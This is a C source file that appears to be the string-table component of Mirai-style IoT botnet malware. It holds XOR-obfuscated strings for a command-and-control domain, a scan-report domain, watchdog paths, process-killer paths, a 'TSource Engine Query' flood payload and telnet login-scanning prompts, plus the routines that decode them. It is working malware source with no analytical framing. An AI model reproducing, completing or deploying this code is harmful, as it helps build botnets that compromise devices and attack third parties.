#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeadbeef;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_EXEC_SUCCESS, "\x53\x43\x58\x55\x51\x5A\x47\x46\x41\x22", 10);

    add_entry(TABLE_CNC_DOMAIN, "\x52\x50\x4D\x5A\x5B\x0C\x10\x57\x12\x43\x52\x41\x4F\x14\x5B\x4E\x4A\x46\x5B\x15\x51\x0C\x41\x4D\x4F\x22", 26);
    add_entry(TABLE_SCAN_REPORT, "\x56\x0C\x10\x57\x12\x43\x52\x41\x4F\x14\x5B\x4E\x4A\x46\x5B\x15\x51\x0C\x41\x4D\x4F\x22", 22);

    add_entry(TABLE_WATCHDOG1, "\x0D\x46\x47\x54\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 14);
    add_entry(TABLE_WATCHDOG2, "\x0D\x46\x47\x54\x0D\x4F\x4B\x51\x41\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 19);
    add_entry(TABLE_WATCHDOG3, "\x0D\x44\x4A\x0D\x47\x5A\x56\x47\x4C\x46\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 20);

    add_entry(TABLE_KILLER_TCP, "\x0D\x52\x50\x4D\x41\x0D\x4C\x47\x56\x0D\x56\x41\x52\x22", 14);
    add_entry(TABLE_KILLER_PROC, "\x0D\x52\x50\x4D\x41\x0D\x22", 7);
    add_entry(TABLE_KILLER_EXE, "\x0D\x47\x5A\x47\x22", 5);
    add_entry(TABLE_KILLER_FD, "\x0D\x44\x46\x22", 4);
    add_entry(TABLE_KILLER_CMDLINE, "\x0D\x41\x4F\x46\x4E\x4B\x4C\x47\x22", 9);

    add_entry(TABLE_ATK_VSE, "\x76\x71\x4D\x57\x50\x41\x47\x02\x67\x4C\x45\x4B\x4C\x47\x02\x73\x57\x47\x50\x5B\x22", 21);
    add_entry(TABLE_ATK_RESOLVER, "\x0D\x47\x56\x41\x0D\x50\x47\x51\x4D\x4E\x54\x0C\x41\x4D\x4C\x44\x22", 17);
    add_entry(TABLE_ATK_NSERV, "\x4C\x43\x4F\x47\x51\x47\x50\x54\x47\x50\x02\x22", 12);
    add_entry(TABLE_KILLER_SOFIA, "\x0D\x54\x43\x50\x0D\x71\x4D\x44\x4B\x43\x22", 11);
    add_entry(TABLE_SCAN_OPEN_OK, "\x6D\x52\x47\x4C\x18\x6D\x69\x22", 8);
    add_entry(TABLE_SCAN_VERIFY_OK, "\x54\x47\x50\x4B\x44\x5B\x18\x6D\x69\x22", 10);
    add_entry(TABLE_SCAN_RAND_NUM, "\x50\x43\x4C\x46\x6C\x57\x4F\x18\x22", 9);
    add_entry(TABLE_SCAN_SEG_FAULT, "\x71\x47\x45\x4F\x47\x4C\x56\x43\x56\x4B\x4D\x4C\x02\x44\x43\x57\x4E\x56\x22", 19);
    add_entry(TABLE_SCAN_ILLEGAL, "\x6B\x4E\x4E\x47\x45\x43\x4E\x02\x4B\x4C\x51\x56\x50\x57\x41\x56\x4B\x4D\x4C\x22", 20);
    add_entry(TABLE_SCAN_DLR_OUTPUT, "\x7A\x64\x61\x65\x64\x22", 6);
    add_entry(TABLE_SCAN_ECHO_RESP, "\x67\x61\x6A\x6D\x18\x02\x43\x52\x52\x4E\x47\x56\x02\x4C\x4D\x56\x02\x44\x4D\x57\x4C\x46\x22", 23);
    add_entry(TABLE_SCAN_ASSWORD, "\x43\x51\x51\x55\x4D\x50\x46\x22", 8);
    add_entry(TABLE_SCAN_OGIN, "\x4D\x45\x4B\x4C\x22", 5);
    add_entry(TABLE_SCAN_ENTER, "\x47\x4C\x56\x47\x50\x22", 6);
    add_entry(TABLE_SCAN_BUSYBOX_RESP, "\x18\x02\x43\x52\x52\x4E\x47\x56\x02\x4C\x4D\x56\x02\x44\x4D\x57\x4C\x46\x22", 19);
    add_entry(TABLE_SCAN_NCORRECT, "\x4C\x41\x4D\x50\x50\x47\x41\x56\x22", 9);
    add_entry(TABLE_SCAN_TNET_OPEN_ONCE, "\x76\x47\x4E\x4C\x47\x56\x18\x6D\x52\x47\x4C\x6D\x4C\x41\x47\x22", 16);

}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
